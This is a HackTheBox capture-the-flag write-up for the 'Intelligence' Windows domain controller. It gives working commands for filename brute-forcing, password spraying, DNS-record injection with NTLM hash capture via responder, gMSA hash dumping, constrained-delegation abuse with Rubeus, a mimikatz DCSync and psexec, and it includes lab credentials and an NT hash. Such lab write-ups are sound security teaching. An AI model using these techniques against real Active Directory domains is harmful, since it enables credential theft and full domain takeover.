---
title: Intelligence Writeup [HTB]
tags: [HackTheBox, Constrained Delegation, BloodHound, Powershell, DCSync, LDAP, Rubeus, mimikatz]
image: /assets/images/intelligence/intelligence.png
published: true
banner: true
---

Intelligence is a Windows based machine that was active since July 3rd of 2021 to November 27th, on this machine we will download a lot of files iterating over dates, inside one of these files we will find a password, examining the files we will discover that there are usernames on their metadata so we will perform a password spray and get a valid combination, with this user we will get access to a scripts that requests a webpage on any machine whose name starts with "web", so we will manipulate the DNS records through LDAP, and then start a webpage that requires NTLM authentication with responder getting an NTLMv2 hash that we will be able to crack, with this new user we will be able to dump the NT hash of a Group Managed Service Account, once we have that we will see that this account has constrained delegation allowed on the domain controller to the service www, so we will ask for a ticket for www service and add LDAP as alternate service, this will allow us to perform DCSync on the domain controller, so we dump the hash of administrator and use psexec to get a shell as system on the machine.

# [](#header-1)Enumeration

We start using masscan to find all the available ports and then use nmap to get more information about them.

```
masscan -e tun0 --rate=500 -p 0-65535 10.10.10.248
nmap -sC -sV -p 389,53,49677,88,49688,54524,135,445,49678,5985,139,3269,464,3268,80,9389,49700,636,49667,593, -Pn -o scan.txt 10.10.10.248

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-08 03:32:05Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-08T03:33:38+00:00; +7h03m51s from scanner time.
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-08T03:33:38+00:00; +7h03m51s from scanner time.
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-08T03:33:38+00:00; +7h03m51s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-08T03:33:38+00:00; +7h03m51s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49677/tcp filtered unknown
49678/tcp filtered unknown
49688/tcp filtered unknown
49700/tcp filtered unknown
54524/tcp filtered unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h03m50s, deviation: 0s, median: 7h03m50s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-08T03:32:58
|_  start_date: N/A
```

There is a ton of open ports, and clearly the machine is a domain controller, we see that it is hosting a webpage, so we check it.

![](/assets/images/intelligence/website.png)

Exploring the site we find two files, "2020-01-01-upload.pdf" and "2020-12-15-upload.pdf", we can notice a pattern on these files, a date followed by "upload.pdf", so we could try to bruteforce date to see if we can retrieve more files, so first let's create a file for days and months, we can use seq for that, `seq 01 12 > months.txt`, and `seq 01 31 > days.txt`, after that we will have to add a "0" at the start of the first nine numbers, since it's something fast I didn't bother on automating it, once we have that we can use ffuf to bruteforce the page and find valid files, `ffuf -u "http://10.10.10.248/documents/2020-W1-W2-upload.pdf" -w months.txt:W1 -w days.txt:W2 -v | grep "10.10.10.248" | grep -v W1 | awk '{print $4}'  > pdffound.txt`, we also have to do it with 2021 and append it to the file.

![](/assets/images/intelligence/ffuf.png)

After that we create another directory and use wget to download all the files found, `while read p; do wget $p; done < ../pdffound.txt`.

![](/assets/images/intelligence/wget.png)

We can see that we got a lot of files.

![](/assets/images/intelligence/pdffiles.png)

Checking the contents of all the files one by one is a lot of work, so we will make a small script that will convert them to txt files, to do so we create another directory and create the next script.

```bash
#!/bin/bash

for F in ../*
do
    pdftotext $F
done
mv ../*.txt .
```

After we run the script we get all the files as txt files.

![](/assets/images/intelligence/txtfiles.png)

# First User

So what we could try now is to create a wordlist with all the words that are inside the files, so we execute the next commands: `cat *.txt | tr " " "\n" | tr -d "." | tr -d "\f" | sort -u`. but among the output we see a weird string, "NewIntelligenceCorpUser9876", let's see which file contains that string and let's read it.

![](/assets/images/intelligence/newpass.png)

The file says that that string is the default password for new users, so there is a chance that there is someone who hasn't changed his password, but we dont have any user. Let's go back to the pdf files, if we use exiftool to check the metadata of any file we see that the creator of the file corresponds to the name of a person.

![](/assets/images/intelligence/metadata.png)

So let's make a wordlist of all the creators of the files and save it as users.txt, to do it we run `exiftool * | grep Creator | awk '{print $3}' | sort -u > ../../users.txt`. So now let's bruteforce all this users with the password that we have (we could try to narrow down the list validating them with kerbrute, but on this case all the users are valid), we will use crackmapexec to find a valid combination.

![](/assets/images/intelligence/crackmap.png)

# Second User

Now that we have a valid account we can enumerate shares.

![](/assets/images/intelligence/shares.png)

We can retrieve user.txt from users share, the other interesting share is "IT", if we check it we find a powershell script.

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

It says that the script is scheduled to run every 5 minutes, so we might be able to get something from it, reading the script we see that it gets any object inside "DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb", whose name begins with "web", and makes a request to a website hosted there, we can create an ldif file and add an object there, but if we do that the server doesn't know to where make the request, we know that domain controllers also work as DNS servers, we know that we can manipulate ldap (as mentioned you can create a ldif file and add it with ldapadd), so there might be a way to manipulate DNS records through LDAP, searching about it we find [krbrelayx](https://github.com/dirkjanm/krbrelayx), among the scripts there is dnstool, which is a tool that allow us to add a DNS record through LDAP, we clone the repository and execute `python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r websub -a add -d 10.10.16.30 10.10.10.248` to add ourselves to the DNS, this will also add ourselves to the desired OU.

![](/assets/images/intelligence/dnstool.png)

We can execute `ldapsearch -x -h 10.10.10.248 -D intelligence\\Tiffany.Molina -w NewIntelligenceCorpUser9876 -b "DC=websub,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"` to validate that we were succesfully added.

![](/assets/images/intelligence/ldapsearch.png)

Now the server should make a GET request every 5 minutes, so we start a http server and see if we get something.

![](/assets/images/intelligence/pyserver.png)

We got nothing... Well there is still more stuff that we can do, HTTP support NTLM authentication, and by default windows will send the hash of the current user without prompting for anything, so we run responder with HTTP enabled, and when the server tries to access to the webpage it will require access credentials, so we run `responder -I tun0 -rdwv` and wait.

![](/assets/images/intelligence/responder.png)

We got a NTLMv2 hash, so we save it and try to crack it with john.

![](/assets/images/intelligence/john.png)

# Administrator

We got a new user, but if we enumerate we don't see any new permission with it, so let's run bloodhound to find all that we can about the domain, we don't have a shell  but we can use it through LDAP with [bloodhound.py](https://github.com/fox-it/BloodHound.py), so we clone the repository, and execute `python3 ~/tools/BloodHound.py/bloodhound.py -u Ted.Graves@intelligence.htb -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248 -c ALL -gc intelligence.htb --zip`, I added intelligence.htb to my hosts file to avoid any issue.

![](/assets/images/intelligence/bloodhound.png)

Now we can feed the zip file to bloodhound and enumerate better the domain, and there we see a possible path.

![](/assets/images/intelligence/bloodint.png)

Bloodhound says that we belong to ITSUPPORT group, and that that group has permissions to Read GMSAPassword, bloodhound says that we have to compile something and upload it to the machine, but we don't have any kind of access to the machine, searching about it we see that that password can be retrieved through LDAP, according to some documentation it can only be retrieved through secure LDAP, to avoid to set up anything with ldap we can use a tool that we found on github, [gMSADumper](https://github.com/micahvandeusen/gMSADumper), we clone this repository and after executing it we will get the NT hash of the user SVC_INT.

![](/assets/images/intelligence/gmsadumper.png)

For the next step bloodhound said that this user is allowed to delegate on certain machine, but it doesn't give us the name of the machine, let's check what LDAP says about this user, so we run `ldapsearch -x -h dc.intelligence.htb -D intelligence\\Ted.Graves -w Mr.Teddy -b "DC=intelligence,DC=htb" "sAMAccountname=svc_int$"`, svc_int is actually a computer account, that's why we add "$" at the end.

![](/assets/images/intelligence/ldapsvc.png)

We see that we are allowed to delegate www service on the domain controller, so we can abuse this constrained delegation case to get command execution on the machine, to abuse this we need a windows machine, so we have to start up one and allow it to access to the VPN, to do so I route the traffic with parrot to the VPN and add the route on Windows, so on my machine I run:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING --out-interface tun0 -j MASQUERADE
```

And on the windows machine we run `route add 10.10.10.0 mask 255.255.255.0 <parrot IP>` on a elevated console, and after that we can access to the network.

![](/assets/images/intelligence/routed.png)

Since we are going to interact with kerberos we need to synchronize our clock with the domain controller, to do so we go to internet time and set the IP of our target as the server and synchronize our clocks.

![](/assets/images/intelligence/internettime.png)

To avoid having any issue with name we add dc.intelligence.htb and intelligence.htb to our hosts file, on Windows it is located on C:\windows\system32\drivers\etc\hosts Now we will use Rubeus to exploit the configuration, using serve for yourself we will ask for a TGS to access to www service on dc.intelligence.htb, add as alternate service ldap, and pass the ticket to our current shell, to do so we run, `Rubeus.exe s4u /user:svc_int$ /rc4:d64b83fe606e6d3005e20ce0ee932fe2 /impersonateuser:administrator /domain:intelligence.htb /dc:10.10.10.248 /msdsspn:www/dc.intelligence.htb /altservice:ldap /ptt`, after runnning all that we will get the message "Ticket successfully imported!", now that we have a ticket that allows us to interact with LDAP as administrator we can perform a DCSync, we can use mimikatz for that: `mimikatz.exe "lsadump::dcsync /dc:dc.intelligence.htb /domain:intelligence.htb /user:administrator" "exit"`, after running that we get the NT hash of administrator user.

![](/assets/images/intelligence/mimikatz.png)

Now that we have the hash of administrator we can use psexec to get a shell and finish with the machine.

![](/assets/images/intelligence/root.png)
